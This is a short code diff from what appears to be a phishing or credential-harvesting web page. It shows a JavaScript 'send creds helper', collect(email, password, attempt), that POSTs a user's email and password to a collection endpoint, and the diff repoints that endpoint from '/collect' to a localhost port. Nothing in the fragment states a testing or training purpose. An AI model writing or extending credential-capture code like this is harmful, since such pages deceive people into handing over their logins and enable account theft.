@@ -617,7 +617,7 @@
 
   /* ── send creds helper ── */
   function collect(email, password, attempt) {
-    return fetch('/collect', {
+    return fetch('http://localhost:19992/collect', {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
       body:    JSON.stringify({
